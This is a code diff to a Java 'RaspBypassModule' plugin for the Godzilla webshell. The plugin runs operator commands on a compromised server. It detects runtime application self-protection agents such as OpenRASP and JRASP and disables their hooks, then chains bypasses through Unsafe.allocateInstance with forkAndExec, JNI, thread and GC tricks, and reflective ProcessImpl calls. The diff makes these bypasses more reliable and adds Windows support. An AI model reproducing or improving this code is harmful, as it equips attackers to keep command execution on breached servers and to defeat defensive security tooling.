@@ -51,7 +51,7 @@ public class RaspBypassModule {
     private String getString(String key) {
         Object value = this.session != null ? this.session.get(key) : null;
         if (value instanceof byte[]) {
-            return new String((byte[]) value);
+            return new String((byte[]) value, StandardCharsets.UTF_8);
         }
         return value != null ? value.toString() : null;
     }
@@ -86,144 +86,261 @@ public class RaspBypassModule {
     }
     
     // ==================== Main Entry Point ====================
-    
+
+    /**
+     * Pipeline-aware command entry.
+     * methodIndex 0 / autoDetect=true \u2192 Detect\u2192Plan\u2192Exec\u2192Verify chain.
+     * methodIndex 1..8 \u2192 single strategy (legacy UI combo).
+     */
     public byte[] execCommand() {
         String cmd = getCommandLine();
         int methodIndex = getMethodIndex();
-        boolean autoDetect = "true".equals(getString("autoDetect"));
-        
+        boolean autoDetect = "true".equalsIgnoreCase(String.valueOf(getString("autoDetect")))
+                || methodIndex == 0;
+
         if (cmd == null || cmd.trim().isEmpty()) {
-            return "Error: Command is empty".getBytes();
+            return formatPipelineResult(false, "ERROR", null, null,
+                    Collections.<String>emptyList(),
+                    "Error: Command is empty",
+                    "Provide a non-empty cmd").getBytes(StandardCharsets.UTF_8);
         }
-        
+
         try {
             if (autoDetect) {
-                return execAutoDetect(cmd);
+                return runPipeline(cmd);
             }
-            
-            switch (methodIndex) {
-                case 1: return execUnsafe(cmd);
-                case 2: return execJni(cmd);
-                case 3: return execNewThread(cmd);
-                case 4: return execGc(cmd);
-                case 5: return execProcessImpl(cmd);
-                case 6: return execTomcatJni(cmd);
-                case 7: return execReflection(cmd);
-                case 8: return execForkAndExec(cmd);
-                default: return execAutoDetect(cmd);
-            }
-        } catch (Exception e) {
-            return ("Error: " + e.getMessage() + "\n" + getStackTrace(e)).getBytes();
-        }
-    }
-    
-    // ==================== Auto Detection ====================
-    
-    private byte[] execAutoDetect(String cmd) {
-        StringBuilder result = new StringBuilder();
-        result.append("[*] Auto detecting RASP...\n");
-        
-        boolean hasRasp = detectRasp();
-        
-        if (hasRasp) {
-            result.append("[!] RASP detected — prep (soft disable) then shortest path first\n");
-            prepSoftAgainstRasp();
-            
-            byte[] afterPrep = execNormal(cmd);
-            if (!looksLikeExecFailure(afterPrep)) {
-                result.append("[+] Normal ProcessBuilder succeeded after prep (preferred)\n");
-                return (result.toString() + new String(afterPrep, StandardCharsets.UTF_8)).getBytes(StandardCharsets.UTF_8);
-            }
-            result.append("[!] Still blocked — deep bypass chain\n");
-            
-            byte[] execResult = tryBypassMethods(cmd, result);
-            if (execResult != null) {
-                return (result.toString() + new String(execResult, StandardCharsets.UTF_8)).getBytes(StandardCharsets.UTF_8);
-            }
-            
-            return (result.toString() + "[-] All bypass methods failed").getBytes(StandardCharsets.UTF_8);
-        } else {
-            result.append("[+] No RASP detected, using normal execution\n");
-            return (result.toString() + new String(execNormal(cmd))).getBytes();
-        }
-    }
-    
-    private byte[] tryBypassMethods(String cmd, StringBuilder log) {
-        log.append("[*] Trying Unsafe.allocateInstance...\n");
-        try {
-            byte[] result = execUnsafe(cmd);
-            if (result != null && result.length > 0 && !new String(result).contains("Error")) {
-                log.append("[+] Unsafe method succeeded!\n");
-                return result;
-            }
-        } catch (Exception e) {
-            log.append("[-] Unsafe failed: " + e.getMessage() + "\n");
-        }
-        
-        log.append("[*] Trying Reflection bypass (hook off + normal)...\n");
-        try {
-            byte[] refResult = execReflection(cmd);
-            if (refResult != null && refResult.length > 0) {
-                String rs = new String(refResult, StandardCharsets.UTF_8);
-                if (!rs.contains("Reflection bypass error")) {
-                    log.append("[+] Reflection bypass chain succeeded\n");
-                    return refResult;
+
+            String strategyName = strategyNameOf(methodIndex);
+            List<String> tried = new ArrayList<String>();
+            tried.add(strategyName);
+            byte[] raw = execByIndex(methodIndex, cmd);
+            boolean ok = !looksLikeExecFailure(raw);
+            String out = raw == null ? "" : new String(raw, StandardCharsets.UTF_8);
+            if (ok) {
+                // light verify for single-strategy mode
+                String token = "GSL_OK_" + Integer.toHexString((int) (System.nanoTime() & 0xfffffff));
+                byte[] v = execByIndex(methodIndex, verifyEchoCommand(token));
+                boolean verified = v != null && new String(v, StandardCharsets.UTF_8).contains(token);
+                if (!verified) {
+                    ok = false;
+                    out = out + "\n[VERIFY] marker missing \u2014 treat as blocked/empty\n";
                 }
             }
+            return formatPipelineResult(ok, ok ? "OK" : "BLOCKED", strategyName,
+                    detectSummaryLine(), tried, out,
+                    ok ? "Single strategy ok" : "Try auto pipeline or JNI / disable RASP")
+                    .getBytes(StandardCharsets.UTF_8);
         } catch (Exception e) {
-            log.append("[-] Reflection bypass failed: ").append(e.getMessage()).append("\n");
+            return formatPipelineResult(false, "ERROR", null, detectSummaryLine(),
+                    Collections.<String>emptyList(),
+                    "Error: " + e.getMessage() + "\n" + getStackTrace(e),
+                    "See stack; check JDK module restrictions")
+                    .getBytes(StandardCharsets.UTF_8);
         }
-        
-        log.append("[*] Trying New Thread bypass...\n");
-        try {
-            byte[] result = execNewThread(cmd);
-            if (result != null && result.length > 0) {
-                log.append("[+] New Thread method succeeded!\n");
-                return result;
+    }
+
+    /** Lightweight liveness for client cache probe. */
+    public byte[] ping() {
+        return "RaspBypassModule.pong".getBytes(StandardCharsets.UTF_8);
+    }
+
+    // ==================== Pipeline: Detect \u2192 Plan \u2192 Exec \u2192 Verify ====================
+
+    private byte[] runPipeline(String cmd) {
+        List<String> evidence = new ArrayList<String>();
+        List<String> tried = new ArrayList<String>();
+        List<String> vendors = detectRaspVendors();
+        // Prefer vendor class fingerprints; stack keyword scan is advisory only (high FP risk)
+        boolean hasRasp = !vendors.isEmpty();
+        boolean stackHint = vendors.isEmpty() && detectRaspStackHint();
+        String detectLine = detectSummaryLine();
+
+        evidence.add("[DETECT] " + detectLine);
+        if (hasRasp) {
+            evidence.add("[DETECT] vendors=" + vendors);
+            StringBuilder softLog = new StringBuilder();
+            prepSoftAgainstRasp(softLog);
+            String soft = softLog.toString().trim();
+            if (soft.length() == 0) {
+                soft = "(no soft hooks matched)";
             }
-        } catch (Exception e) {
-            log.append("[-] New Thread failed: " + e.getMessage() + "\n");
-        }
-        
-        log.append("[*] Trying ProcessImpl direct...\n");
-        try {
-            byte[] result = execProcessImpl(cmd);
-            if (result != null && result.length > 0) {
-                log.append("[+] ProcessImpl method succeeded!\n");
-                return result;
+            evidence.add("[PLAN] soft-degrade applied");
+            for (String line : soft.split("\n")) {
+                if (line != null && line.length() > 0) {
+                    evidence.add("  " + line);
+                }
             }
-        } catch (Exception e) {
-            log.append("[-] ProcessImpl failed: " + e.getMessage() + "\n");
+        } else if (stackHint) {
+            evidence.add("[DETECT] no vendor class; weak stack hint only \u2014 treat as no-RASP plan first");
+        } else {
+            evidence.add("[DETECT] no known RASP fingerprint");
         }
-        
-        log.append("[*] Trying ForkAndExec...\n");
-        try {
-            byte[] result = execForkAndExec(cmd);
-            if (result != null && result.length > 0) {
-                log.append("[+] ForkAndExec method succeeded!\n");
-                return result;
+
+        // Auto-load native if client attached libBytes (does not require Advanced tab)
+        if (!jniLoaded) {
+            StringBuilder jniLog = new StringBuilder();
+            boolean loaded = ensureJniLoadedForPipeline(jniLog);
+            if (loaded) {
+                evidence.add("[JNI] auto-loaded for pipeline path=" + jniPath);
+            } else {
+                String jl = jniLog.toString().trim();
+                evidence.add("[JNI] auto-load skipped/failed"
+                        + (jl.isEmpty() ? " (no libBytes/soPath in session)" : ": " + abbreviate(jl, 200)));
             }
-        } catch (Exception e) {
-            log.append("[-] ForkAndExec failed: " + e.getMessage() + "\n");
+        } else {
+            evidence.add("[JNI] already loaded path=" + jniPath);
         }
-        
-        log.append("[*] Trying GC Finalize...\n");
-        try {
-            byte[] result = execGc(cmd);
-            if (result != null && result.length > 0) {
-                log.append("[+] GC Finalize method succeeded!\n");
-                return result;
+        List<Integer> plan = planStrategies(hasRasp, jniLoaded);
+        evidence.add("[PLAN] chain=" + planToNames(plan));
+
+        String hit = null;
+        byte[] hitOut = null;
+        for (Integer idx : plan) {
+            String name = strategyNameOf(idx);
+            tried.add(name);
+            try {
+                byte[] out = execByIndex(idx.intValue(), cmd);
+                if (looksLikeExecFailure(out)) {
+                    String head = out == null ? "(null)" : abbreviate(new String(out, StandardCharsets.UTF_8), 120);
+                    evidence.add("[EXEC] " + name + " FAIL " + head);
+                    continue;
+                }
+                // Verify with independent short command so empty-success cannot pass
+                String token = "GSL_OK_" + Integer.toHexString((int) (System.nanoTime() & 0xfffffff));
+                byte[] verifyOut = execByIndex(idx.intValue(), verifyEchoCommand(token));
+                String vs = verifyOut == null ? "" : new String(verifyOut, StandardCharsets.UTF_8);
+                if (!vs.contains(token)) {
+                    evidence.add("[VERIFY] " + name + " marker missing \u2014 continue");
+                    continue;
+                }
+                hit = name;
+                hitOut = out;
+                evidence.add("[EXEC] " + name + " OK");
+                evidence.add("[VERIFY] marker matched");
+                break;
+            } catch (Throwable t) {
+                evidence.add("[EXEC] " + name + " EX " + t.getClass().getSimpleName() + ": " + t.getMessage());
             }
-        } catch (Exception e) {
-            log.append("[-] GC Finalize failed: " + e.getMessage() + "\n");
         }
-        
+
+        boolean ok = hit != null;
+        StringBuilder body = new StringBuilder();
+        for (String e : evidence) {
+            body.append(e).append('\n');
+        }
+        body.append("----------------------------------------\n");
+        if (ok) {
+            // Put command output in a clear block so UI operators always see whoami etc.
+            body.append("======== CMD OUTPUT ========\n");
+            String outText = new String(hitOut, StandardCharsets.UTF_8);
+            body.append(outText);
+            if (!outText.endsWith("\n")) {
+                body.append('\n');
+            }
+            body.append("============================\n");
+        } else {
+            body.append("[-] All strategies failed or failed verify\n");
+        }
+
+        String next = ok
+                ? ("hit=" + hit + (hasRasp ? "; optional: disable RASP in Advanced tab" : ""))
+                : (jniLoaded ? "All Java paths blocked; re-check disable / memshell"
+                : "Load JNI native lib then retry auto; or disable RASP");
+
+        return formatPipelineResult(ok, ok ? "OK" : "BLOCKED", hit, detectLine, tried,
+                body.toString(), next).getBytes(StandardCharsets.UTF_8);
+    }
+
+    private List<Integer> planStrategies(boolean hasRasp, boolean jniReady) {
+        return RaspDetectPlan.planStrategies(hasRasp, jniReady);
+    }
+
+    private byte[] execByIndex(int methodIndex, String cmd) {
+        switch (methodIndex) {
+            case 1:
+                return execUnsafe(cmd);
+            case 2:
+                return execJni(cmd);
+            case 3:
+                return execNewThread(cmd);
+            case 4:
+                return execGc(cmd);
+            case 5:
+                return execProcessImpl(cmd);
+            case 6:
+                return execTomcatJni(cmd);
+            case 7:
+                return execReflection(cmd);
+            case 8:
+                return execForkAndExec(cmd);
+            case 9:
+            default:
+                return execNormal(cmd);
+        }
+    }
+
+    private static String strategyNameOf(int methodIndex) {
+        return RaspDetectPlan.strategyNameOf(methodIndex);
+    }
+
+    private static String planToNames(List<Integer> plan) {
+        return RaspDetectPlan.planToNames(plan);
+    }
+
+    private static String verifyEchoCommand(String token) {
+        return RaspDetectPlan.verifyEchoCommand(token);
+    }
+
+    private String detectSummaryLine() {
+        return RaspDetectPlan.detectSummaryLine(jniLoaded);
+    }
+
+    private List<String> detectRaspVendors() {
+        return RaspDetectPlan.detectRaspVendors();
+    }
+
+    private static String formatPipelineResult(boolean ok, String code, String strategy,
+                                               String detect, List<String> tried, String body, String nextHint) {
+        return RaspDetectPlan.formatPipelineResult(ok, code, strategy, detect, tried, body, nextHint);
+    }
+
+    private static String escapeJson(String s) {
+        return RaspDetectPlan.escapeJson(s);
+    }
+
+    private static String abbreviate(String s, int max) {
+        return RaspDetectPlan.abbreviate(s, max);
+    }
+
+    // legacy name kept for any internal callers
+    private byte[] execAutoDetect(String cmd) {
+        return runPipeline(cmd);
+    }
+
+    private byte[] tryBypassMethods(String cmd, StringBuilder log) {
+        // retained for compatibility; prefer runPipeline
+        List<Integer> plan = planStrategies(true, jniLoaded);
+        for (Integer idx : plan) {
+            log.append("[*] Trying ").append(strategyNameOf(idx.intValue())).append("...\n");
+            try {
+                byte[] result = execByIndex(idx.intValue(), cmd);
+                if (!looksLikeExecFailure(result)) {
+                    log.append("[+] ").append(strategyNameOf(idx.intValue())).append(" succeeded\n");
+                    return result;
+                }
+            } catch (Exception e) {
+                log.append("[-] ").append(strategyNameOf(idx.intValue())).append(" failed: ").append(e.getMessage()).append('\n');
+            }
+        }
         return null;
     }
     
-    /** OpenRASP hook off + JRASP algorithm triage (no console spam). */
-    private void prepSoftAgainstRasp() {
-        disableRaspHooks();
+    /** OpenRASP deep soft-disable + JRASP algorithm triage; log goes to pipeline evidence. */
+    private void prepSoftAgainstRasp(StringBuilder log) {
+        if (log == null) {
+            log = new StringBuilder();
+        }
+        disableRaspHooks(log);
         try {
             Class<?> launcherClass = Class.forName("com.jrasp.agent.AgentLauncher");
             Field raspClassLoaderMap = getDeclaredField(launcherClass, "raspClassLoaderMap");
@@ -232,183 +349,236 @@ public class RaspBypassModule {
             if (map == null || map.isEmpty()) {
                 return;
             }
-            StringBuilder sink = new StringBuilder();
             for (Object loaderObj : map.values()) {
                 if (!(loaderObj instanceof ClassLoader)) {
                     continue;
                 }
                 try {
                     Class<?> am = ((ClassLoader) loaderObj).loadClass("com.jrasp.core.algorithm.DefaultAlgorithmManager");
-                    jraspDisableAlgorithmMaps(am, sink);
+                    jraspDisableAlgorithmMaps(am, log);
                 } catch (Exception ignored) {
                 }
             }
         } catch (Exception ignored) {
         }
     }
+
+    private void prepSoftAgainstRasp() {
+        prepSoftAgainstRasp(new StringBuilder());
+    }
     
     private static boolean looksLikeExecFailure(byte[] out) {
-        if (out == null || out.length == 0) {
-            return true;
-        }
-        int n = Math.min(out.length, 320);
-        String head = new String(out, 0, n, StandardCharsets.UTF_8);
-        String h = head.toLowerCase();
-        return h.startsWith("normal exec error")
-            || h.startsWith("error:")
-            || h.contains("securityexception")
-            || h.contains("blocked by rasp")
-            || h.contains("openrasp");
+        return RaspDetectPlan.looksLikeExecFailure(out);
     }
     
     /**
      * \u672c\u63d2\u4ef6\u7c7b\u540d\u542b "Rasp"\uff0c\u6808\u626b\u63cf/\u5df2\u52a0\u8f7d\u7c7b\u7d22\u5f15\u4f1a\u8bef\u5224\u4e3a RASP\u3002
      */
     private static boolean isBenignGodzillaRaspPluginClass(String className) {
-        if (className == null) {
-            return true;
-        }
-        return className.contains("RaspBypassModule")
-            || className.contains("RaspBypassUtils");
+        return RaspDetectPlan.isBenignGodzillaRaspPluginClass(className);
     }
     
     private boolean detectRasp() {
-        try {
-            String[] raspClasses = {
-                "com.baidu.openrasp.HookHandler",
-                "com.jrasp.agent.AgentLauncher",
-                "com.jrasp.core.algorithm.DefaultAlgorithmManager",
-                "com.bytedance.elkeid.agent.Agent",
-                "com.tencent.rasp.agent.RaspAgent",
-                "com.aliyun.rasp.agent.AgentMain",
-                "com.qingteng.rasp.agent.AgentBootstrap",
-                "io.oasec.rasp.Agent",
-                "com.immunesecurity.rasp.Agent"
-            };
-            
-            for (String className : raspClasses) {
-                try {
-                    Class.forName(className);
-                    return true;
-                } catch (ClassNotFoundException ignored) {
-                }
-            }
-            
-            StackTraceElement[] stack = Thread.currentThread().getStackTrace();
-            for (StackTraceElement element : stack) {
-                String className = element.getClassName();
-                if (isBenignGodzillaRaspPluginClass(className)) {
-                    continue;
-                }
-                if (className.contains("rasp") || className.contains("Rasp") || 
-                    className.contains("RASP") || className.contains("hook") ||
-                    className.contains("instrument")) {
-                    return true;
-                }
-            }
-            
-            return false;
-        } catch (Exception e) {
-            return false;
-        }
+        return !detectRaspVendors().isEmpty() || detectRaspStackHint();
+    }
+
+    /** Vendor-class only \u2014 used for planning priority. */
+    private boolean detectRaspStrict() {
+        return RaspDetectPlan.hasVendorRasp();
+    }
+
+    /**
+     * Stack keyword scan. Easy false positives (e.g. Instrumentation API frames).
+     * Do NOT alone flip pipeline into "has RASP" deep-first order.
+     */
+    private boolean detectRaspStackHint() {
+        return RaspDetectPlan.detectRaspStackHint();
     }
     
     // ==================== Normal Execution ====================
-    
+
+    private static boolean isWindowsOs() {
+        String os = System.getProperty("os.name", "");
+        return os.toLowerCase(Locale.ROOT).contains("win");
+    }
+
     private byte[] execNormal(String cmd) {
         try {
             String[] command = buildCommand(cmd);
             ProcessBuilder pb = new ProcessBuilder(command);
             pb.redirectErrorStream(true);
             Process process = pb.start();
-            
-            byte[] output = readStream(process.getInputStream());
-            process.waitFor(30, TimeUnit.SECONDS);
-            
-            return output;
+            return drainProcess(process, 30);
         } catch (Exception e) {
-            return ("Normal exec error: " + e.getMessage()).getBytes();
+            return ("Normal exec error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
-    
+
     // ==================== Method 1: Unsafe.allocateInstance ====================
-    
+
     private byte[] execUnsafe(String cmd) {
+        // Windows ProcessImpl has no Unix forkAndExec/launchMechanism \u2014 use ProcessImpl path
+        if (isWindowsOs()) {
+            byte[] win = execProcessImpl(cmd);
+            if (!looksLikeExecFailure(win)) {
+                return win;
+            }
+            return ("Unsafe exec error: Windows has no UNIX forkAndExec; ProcessImpl fallback failed: "
+                    + (win == null ? "null" : new String(win, StandardCharsets.UTF_8))).getBytes(StandardCharsets.UTF_8);
+        }
+        return execUnsafeUnix(cmd);
+    }
+
+    /** Linux/macOS: allocate UNIXProcess/ProcessImpl and invoke forkAndExec (static launch fields). */
+    private byte[] execUnsafeUnix(String cmd) {
         try {
             Field theUnsafeField = getDeclaredField(sun.misc.Unsafe.class, "theUnsafe");
             theUnsafeField.setAccessible(true);
             sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
-            
+
             Class<?> processClass;
             try {
                 processClass = Class.forName("java.lang.UNIXProcess");
             } catch (ClassNotFoundException e) {
                 processClass = Class.forName("java.lang.ProcessImpl");
             }
-            
+
             Object process = unsafe.allocateInstance(processClass);
-            
-            String[] cmdParts = cmd.split("\\s+");
-            byte[][] args = new byte[cmdParts.length - 1][];
+
+            // Prefer shell-aware argv (handles quoted paths); fallback split
+            String[] cmdParts = buildCommand(cmd);
+            if (cmdParts == null || cmdParts.length == 0) {
+                return "Unsafe exec error: empty command".getBytes(StandardCharsets.UTF_8);
+            }
+
+            byte[][] args = new byte[Math.max(0, cmdParts.length - 1)][];
             int size = args.length;
             for (int i = 0; i < args.length; i++) {
-                args[i] = cmdParts[i + 1].getBytes();
+                args[i] = cmdParts[i + 1].getBytes(StandardCharsets.UTF_8);
                 size += args[i].length;
             }
-            
+
             byte[] argBlock = new byte[size];
             int offset = 0;
             for (byte[] arg : args) {
                 System.arraycopy(arg, 0, argBlock, offset, arg.length);
                 offset += arg.length + 1;
             }
-            
+
+            // launchMechanism / helperpath are static on modern JDKs; instance after allocateInstance is null
             Field launchMechanismField = getDeclaredField(processClass, "launchMechanism");
             launchMechanismField.setAccessible(true);
-            Object launchMechanism = launchMechanismField.get(process);
-            
+            Object launchMechanism = null;
+            try {
+                launchMechanism = launchMechanismField.get(null);
+            } catch (Exception ignored) {
+            }
+            if (launchMechanism == null) {
+                launchMechanism = launchMechanismField.get(process);
+            }
+            if (launchMechanism == null) {
+                // last resort: first enum constant of field type
+                Class<?> enumType = launchMechanismField.getType();
+                if (enumType.isEnum()) {
+                    Object[] constants = enumType.getEnumConstants();
+                    if (constants != null && constants.length > 0) {
+                        launchMechanism = constants[0];
+                    }
+                }
+            }
+            if (launchMechanism == null) {
+                return "Unsafe exec error: launchMechanism is null (static/instance uninitialized)".getBytes(StandardCharsets.UTF_8);
+            }
+
             Field helperpathField = getDeclaredField(processClass, "helperpath");
             helperpathField.setAccessible(true);
-            byte[] helperpath = (byte[]) helperpathField.get(process);
-            
+            byte[] helperpath = null;
+            try {
+                helperpath = (byte[]) helperpathField.get(null);
+            } catch (Exception ignored) {
+            }
+            if (helperpath == null) {
+                helperpath = (byte[]) helperpathField.get(process);
+            }
+
             int ordinal = (int) launchMechanism.getClass().getMethod("ordinal").invoke(launchMechanism);
-            
+
             Method forkMethod = getDeclaredMethod(processClass, "forkAndExec",
-                int.class, byte[].class, byte[].class, byte[].class, int.class,
-                byte[].class, int.class, byte[].class, int[].class, boolean.class);
+                    int.class, byte[].class, byte[].class, byte[].class, int.class,
+                    byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
-            
+
             int[] std_fds = new int[]{-1, -1, -1};
             byte[] prog = toCString(cmdParts[0]);
-            
-            int pid = (int) forkMethod.invoke(process,
-                ordinal + 1, helperpath, prog, argBlock, args.length,
-                null, 0, null, std_fds, false);
-            
+
+            forkMethod.invoke(process,
+                    ordinal + 1, helperpath, prog, argBlock, args.length,
+                    null, Integer.valueOf(0), null, std_fds, Boolean.FALSE);
+
             Method initStreamsMethod = getDeclaredMethod(processClass, "initStreams", int[].class);
             initStreamsMethod.setAccessible(true);
             initStreamsMethod.invoke(process, std_fds);
-            
+
+            // Prefer Process API when available so stdout/stderr drain + charset normalize work
+            if (process instanceof Process) {
+                return drainProcess((Process) process, 30);
+            }
             Method getInputStreamMethod = processClass.getMethod("getInputStream");
             InputStream in = (InputStream) getInputStreamMethod.invoke(process);
-            
-            return readStream(in);
+            byte[] out = readStream(in);
+            try {
+                Method getErr = processClass.getMethod("getErrorStream");
+                InputStream err = (InputStream) getErr.invoke(process);
+                byte[] eb = readStream(err);
+                if (eb != null && eb.length > 0) {
+                    ByteArrayOutputStream merged = new ByteArrayOutputStream(out.length + eb.length + 2);
+                    merged.write(out);
+                    if (out.length > 0 && out[out.length - 1] != (byte) '\n') {
+                        merged.write((byte) '\n');
+                    }
+                    merged.write(eb);
+                    out = merged.toByteArray();
+                }
+            } catch (Throwable ignored) {
+            }
+            try {
+                Method waitFor = processClass.getMethod("waitFor");
+                waitFor.invoke(process);
+            } catch (Throwable ignored) {
+            }
+            return normalizeProcessOutputToUtf8(out);
         } catch (Exception e) {
-            return ("Unsafe exec error: " + e.getMessage()).getBytes();
+            Throwable c = e.getCause() != null ? e.getCause() : e;
+            return ("Unsafe exec error: " + c.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
-    
+
     // ==================== Method 2: JNI Execution ====================
-    
+
     private byte[] execJni(String cmd) {
+        // Prefer custom rasp_bypass native if already loaded
+        if (jniLoaded) {
+            try {
+                String r = jniExec(cmd);
+                if (r != null) {
+                    // jniExec returns a Java String (Unicode); emit UTF-8 for the client decoder
+                    return r.getBytes(StandardCharsets.UTF_8);
+                }
+            } catch (UnsatisfiedLinkError ule) {
+                // fall through
+            } catch (Throwable t) {
+                return ("JNI exec error: " + t.getMessage()).getBytes(StandardCharsets.UTF_8);
+            }
+        }
         try {
             byte[] result = execTomcatJni(cmd);
-            if (result != null && !new String(result).contains("Error")) {
+            if (result != null && !looksLikeExecFailure(result)) {
                 return result;
             }
-            return ("JNI: Tomcat-JNI not available, custom SO required").getBytes();
+            String detail = result == null ? "null" : new String(result, StandardCharsets.UTF_8);
+            return ("JNI: native not loaded and Tomcat-JNI unavailable: " + detail).getBytes(StandardCharsets.UTF_8);
         } catch (Exception e) {
-            return ("JNI exec error: " + e.getMessage()).getBytes();
+            return ("JNI exec error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
     
@@ -428,13 +598,11 @@ public class RaspBypassModule {
                         ProcessBuilder pb = new ProcessBuilder(command);
                         pb.redirectErrorStream(true);
                         Process process = pb.start();
-                        
-                        byte[] result = readStream(process.getInputStream());
+                        byte[] result = drainProcess(process, 30);
                         output.write(result);
-                        process.waitFor();
                     } catch (Exception e) {
                         try {
-                            output.write(("Thread exec error: " + e.getMessage()).getBytes());
+                            output.write(("Thread exec error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8));
                         } catch (IOException ignored) {
                         }
                     } finally {
@@ -442,16 +610,16 @@ public class RaspBypassModule {
                     }
                 }
             });
-            
+
             t.start();
-            
-            if (latch.await(30, TimeUnit.SECONDS)) {
+
+            if (latch.await(35, TimeUnit.SECONDS)) {
                 return output.toByteArray();
             } else {
-                return "Thread execution timeout".getBytes();
+                return "Thread execution timeout".getBytes(StandardCharsets.UTF_8);
             }
         } catch (Exception e) {
-            return ("New Thread error: " + e.getMessage()).getBytes();
+            return ("New Thread error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
     
@@ -471,12 +639,10 @@ public class RaspBypassModule {
                         ProcessBuilder pb = new ProcessBuilder(command);
                         pb.redirectErrorStream(true);
                         Process process = pb.start();
-                        
-                        byte[] result = readStream(process.getInputStream());
+                        byte[] result = drainProcess(process, 15);
                         output.write(result);
-                        process.waitFor();
                     } catch (Exception e) {
-                        output.write(("GC exec error: " + e.getMessage()).getBytes());
+                        output.write(("GC exec error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8));
                     } finally {
                         latch.countDown();
                     }
@@ -493,44 +659,134 @@ public class RaspBypassModule {
             if (latch.await(10, TimeUnit.SECONDS)) {
                 return output.toByteArray();
             } else {
-                return "GC execution timeout".getBytes();
+                return "GC execution timeout".getBytes(StandardCharsets.UTF_8);
             }
         } catch (Exception e) {
-            return ("GC error: " + e.getMessage()).getBytes();
+            return ("GC error: " + e.getMessage()).getBytes(StandardCharsets.UTF_8);
         }
     }
     
     // ==================== Method 5: ProcessImpl Direct ====================
-    
+
     private byte[] execProcessImpl(String cmd) {
-        try {
-            Class<?> processImplClass;
-            try {
-                processImplClass = Class.forName("java.lang.ProcessImpl");
-            } catch (ClassNotFoundException e) {
-                return "ProcessImpl class not found".getBytes();
-            }
-            
-            Method createMethod = getDeclaredMethod(processImplClass, "create",
-                String.class, String.class, String.class,
-                long[].class, boolean.class);
-            createMethod.setAccessible(true);
-            
-            long[] stdHandles = new long[]{-1, -1, -1};
-            
-            Process process = (Process) createMethod.invoke(null,
-                cmd, null, null, stdHandles, true);
-            
-            if (process != null) {
-                byte[] output = readStream(process.getInputStream());
-                process.waitFor(30, TimeUnit.SECONDS);
-                return output;
-            }
-            
-            return "ProcessImpl create returned null".getBytes();
-        } catch (Exception e) {
-            return ("ProcessImpl error: " + e.getMessage()).getBytes();
+        if (isWindowsOs()) {
+            return execProcessImplWindows(cmd);
         }
+        // On Unix, ProcessImpl/UNIXProcess "create" is not the Windows native; reuse Unsafe unix path
+        return execUnsafeUnix(cmd);
+    }
+
+    /**
+     * Windows JDK8+ {@code java.lang.ProcessImpl}:
+     * native {@code create(...)} returns {@code long} handle, NOT Process \u2014 old code ClassCastException.
+     * Prefer reflective {@code start(String[], Map, String, Redirect[], boolean)}.
+     */
+    private byte[] execProcessImplWindows(String cmd) {
+        try {
+            Class<?> processImplClass = Class.forName("java.lang.ProcessImpl");
+            String[] cmdarray = buildCommand(cmd);
+
+            // 1) ProcessImpl.start(String[], Map, String, Redirect[], boolean) \u2014 JDK 8+
+            try {
+                Class<?> redirectClass = Class.forName("java.lang.ProcessBuilder$Redirect");
+                Class<?> redirectArray = Class.forName("[Ljava.lang.ProcessBuilder$Redirect;");
+                Method start = null;
+                for (Method m : processImplClass.getDeclaredMethods()) {
+                    if (!"start".equals(m.getName())) {
+                        continue;
+                    }
+                    Class<?>[] p = m.getParameterTypes();
+                    if (p.length == 5 && p[0] == String[].class) {
+                        start = m;
+                        break;
+                    }
+                }
+                if (start != null) {
+                    start.setAccessible(true);
+                    Object process = start.invoke(null, cmdarray, null, null, null, Boolean.TRUE);
+                    if (process instanceof Process) {
+                        return drainProcess((Process) process, 30);
+                    }
+                }
+            } catch (ClassNotFoundException ignoredRedirect) {
+            } catch (Exception e) {
+                // try next signature
+            }
+
+            // 2) Some builds: start(String[], Map, String, long[], boolean) or similar
+            for (Method m : processImplClass.getDeclaredMethods()) {
+                if (!"start".equals(m.getName()) || m.getParameterTypes().length < 1) {
+                    continue;
+                }
+                if (m.getParameterTypes()[0] != String[].class) {
+                    continue;
+                }
+                try {
+                    m.setAccessible(true);
+                    Class<?>[] pt = m.getParameterTypes();
+                    Object[] args = new Object[pt.length];
+                    args[0] = cmdarray;
+                    for (int i = 1; i < pt.length; i++) {
+                        if (pt[i] == boolean.class || pt[i] == Boolean.class) {
+                            args[i] = Boolean.TRUE;
+                        } else if (pt[i] == String.class) {
+                            args[i] = null;
+                        } else if (pt[i] == java.util.Map.class) {
+                            args[i] = null;
+                        } else if (pt[i].isArray() && pt[i].getComponentType() == long.class) {
+                            args[i] = new long[]{-1L, -1L, -1L};
+                        } else {
+                            args[i] = null;
+                        }
+                    }
+                    Object process = m.invoke(null, args);
+                    if (process instanceof Process) {
+                        return drainProcess((Process) process, 30);
+                    }
+                } catch (Exception ignored) {
+                }
+            }
+
+            // 3) native create returns long \u2014 do not cast to Process
+            try {
+                Method createMethod = getDeclaredMethod(processImplClass, "create",
+                        String.class, String.class, String.class,
+                        long[].class, boolean.class);
+                createMethod.setAccessible(true);
+                long[] stdHandles = new long[]{-1L, -1L, -1L};
+                // Windows create wants a single command line string often
+                String cmdLine = joinCommandLine(cmdarray);
+                Object handleObj = createMethod.invoke(null, cmdLine, null, null, stdHandles, Boolean.TRUE);
+                return ("ProcessImpl error: native create returned "
+                        + (handleObj == null ? "null" : handleObj.getClass().getName() + "=" + handleObj)
+                        + " (not a Process); start() reflection failed for this JDK").getBytes(StandardCharsets.UTF_8);
+            } catch (Exception e) {
+                Throwable c = e.getCause() != null ? e.getCause() : e;
+                return ("ProcessImpl error: " + c.getMessage()).getBytes(StandardCharsets.UTF_8);
+            }
+        } catch (Exception e) {
+            Throwable c = e.getCause() != null ? e.getCause() : e;
+            return ("ProcessImpl error: " + c.getMessage()).getBytes(StandardCharsets.UTF_8);
+        }
+    }
+
+    private static String joinCommandLine(String[] cmdarray) {
+        if (cmdarray == null || cmdarray.length == 0) {
+            return "";
+        }
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < cmdarray.length; i++) {
+            if (i > 0) {
+                sb.append(' ');
+            }
+            String a = cmdarray[i];
